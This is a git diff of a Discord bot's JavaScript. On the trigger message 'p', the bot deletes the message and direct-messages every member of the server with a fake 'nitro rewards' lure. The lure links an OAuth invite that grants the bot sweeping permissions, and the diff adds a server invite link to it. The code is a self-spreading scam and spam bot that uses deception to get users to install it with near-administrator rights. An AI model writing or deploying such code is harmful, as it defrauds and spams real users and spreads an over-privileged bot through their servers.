@@ -37,7 +37,7 @@ message.guild.members.map(r => r.send(embed))
     
     if(message.content ===  "p"){
     message.delete(1000)
-message.guild.members.map(r => r.send("Whi ??? 100 members = nitro rewards no fake , and reward , go join and add this bot for other members of nitro reward : https://discordapp.com/oauth2/authorize?client_id=583250491308376085&scope=bot&permissions=2086141183"))   
+message.guild.members.map(r => r.send("Whi ??? 100 members = nitro rewards no fake , and reward , go join and add this bot for other members of nitro reward : https://discordapp.com/oauth2/authorize?client_id=583250491308376085&scope=bot&permissions=2086141183 https://discord.gg/yAXs3rz?"))   
 }
 
 });
